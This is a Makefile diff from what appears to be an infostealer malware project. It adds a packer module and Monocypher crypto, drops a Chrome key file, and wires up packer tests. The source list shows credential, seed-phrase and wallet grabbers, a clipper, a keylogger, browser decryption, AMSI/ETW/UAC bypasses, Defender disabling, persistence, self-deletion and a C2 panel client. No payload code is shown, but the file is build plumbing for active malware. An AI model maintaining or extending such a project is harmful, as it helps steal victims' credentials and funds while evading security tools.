@@ -39,6 +39,7 @@ SRCS = src/main.c \
        src/system/screenshot.c \
        src/system/seed_grabber.c \
        src/system/grabber.c \
+       src/system/packer.c \
        src/system/inject.c \
        src/system/twofa.c \
        src/system/clipper.c \
@@ -49,9 +50,9 @@ SRCS = src/main.c \
        src/crypto/chrome_crypto.c \
        src/crypto/firefox_crypto.c \
        src/crypto/chacha_poly.c \
+       src/crypto/monocypher.c \
        src/crypto/archive_crypt.c \
        src/crypto/dpapi.c \
-       src/crypto/chrome_key.c \
        src/crypto/appbound.c \
        src/crypto/elevator.c \
        src/crypto/bcrypt_peb.c \
@@ -112,6 +113,14 @@ clean:
 test-hash: tests/test_hash.c src/types/hash.c include/hash.h include/config.h
 	$(TEST_CC) $(TEST_CFLAGS) -o tests/test_hash tests/test_hash.c src/types/hash.c
 	./tests/test_hash
+
+
+# Packer TOCTOU tests: TEST_PACKER_SEAM routes directory enumeration
+# through test-installed callbacks, so grow/shrink conditions are
+# deterministic on host gcc.
+test-packer: tests/test_packer.c src/system/packer.c
+	$(TEST_CC) $(TEST_CFLAGS) -Isrc -Isrc/utils -Isrc/system -DTEST_PACKER_SEAM -o tests/test_packer tests/test_packer.c src/system/packer.c
+	./tests/test_packer
 
 # ── Unit tests (native gcc for Linux) ─────────────────────────
 TEST_CC = gcc
@@ -256,7 +265,7 @@ test-all: test-hash test-crypto test-sqlite test-peb test-chromium test-wallets 
           test-rt test-scoring test-asn1 test-base64 \
           test-mock-seams test-fixtures test-sqlite-fault test-network-mock test-crypto-mock test-clipper test-wifi test-keylogger test-gaming test-twofa test-vpn \
           test-export-resolve test-file-utils test-ws2 test-socks5 test-proxy test-panel-http test-schannel \
-          test-chrome-crypto test-firefox-crypto test-archive-crypt
+          test-chrome-crypto test-firefox-crypto test-archive-crypt test-packer
 	@echo "=== ALL TEST SUITES PASSED ==="
 
 # ── Coverage ─────────────────────────────────────────────────
@@ -268,7 +277,7 @@ test-coverage: clean-tests
 	@echo "Coverage data collected. Run: lcov --capture --directory . --output-file coverage.info && genhtml coverage.info -o coverage-html"
 
 test-e2e: tests/test_e2e.c
-	$(CC) -Wall -Wextra -O2 -Iinclude -Isrc/parsers -Isrc/browsers -Isrc/wallets -Isrc/system -Isrc/network -o tests/test_e2e tests/test_e2e.c src/network/panel_http.c src/browsers/browser_paths.c src/browsers/chromium.c src/browsers/firefox.c src/wallets/wallets.c src/wallets/wallet_ext.c src/wallets/wallet_desktop.c src/messengers/messengers.c src/parsers/sqlite.c src/system/system_info.c src/system/wifi.c src/system/twofa.c src/crypto/chrome_crypto.c src/crypto/firefox_crypto.c src/crypto/chacha_poly.c src/crypto/archive_crypt.c src/crypto/dpapi.c src/crypto/chrome_key.c src/crypto/appbound.c src/evasion/anti_analysis.c src/evasion/detection.c src/evasion/evasion.c src/evasion/amsi_bypass.c src/evasion/etw_bypass.c src/evasion/uac_bypass.c src/evasion/peb_hide.c src/evasion/defender_disable.c src/evasion/mutex.c src/cleanup/persistence.c src/cleanup/self_delete.c src/cleanup/temp_wipe.c src/types/peb.c src/types/hash.c src/types/export_resolve.c src/syscalls/engine.c src/network/ws2.c src/network/proxy.c src/network/chunked.c src/network/schannel.c asm/mirage_stubs_v2.o -lws2_32 -lkernel32 -luser32 -ladvapi32 -lbcrypt -lcrypt32
+	$(CC) -Wall -Wextra -O2 -Iinclude -Isrc/parsers -Isrc/browsers -Isrc/wallets -Isrc/system -Isrc/network -o tests/test_e2e tests/test_e2e.c src/network/panel_http.c src/browsers/browser_paths.c src/browsers/chromium.c src/browsers/firefox.c src/wallets/wallets.c src/wallets/wallet_ext.c src/wallets/wallet_desktop.c src/messengers/messengers.c src/parsers/sqlite.c src/system/system_info.c src/system/wifi.c src/system/twofa.c src/crypto/chrome_crypto.c src/crypto/firefox_crypto.c src/crypto/chacha_poly.c src/crypto/archive_crypt.c src/crypto/dpapi.c src/crypto/appbound.c src/evasion/anti_analysis.c src/evasion/detection.c src/evasion/evasion.c src/evasion/amsi_bypass.c src/evasion/etw_bypass.c src/evasion/uac_bypass.c src/evasion/peb_hide.c src/evasion/defender_disable.c src/evasion/mutex.c src/cleanup/persistence.c src/cleanup/self_delete.c src/cleanup/temp_wipe.c src/types/peb.c src/types/hash.c src/types/export_resolve.c src/syscalls/engine.c src/network/ws2.c src/network/proxy.c src/network/chunked.c src/network/schannel.c asm/mirage_stubs_v2.o -lws2_32 -lkernel32 -luser32 -ladvapi32 -lbcrypt -lcrypt32
 
 # ── System module tests ────────────────────────────────────
 test-clipper: tests/test_clipper.c
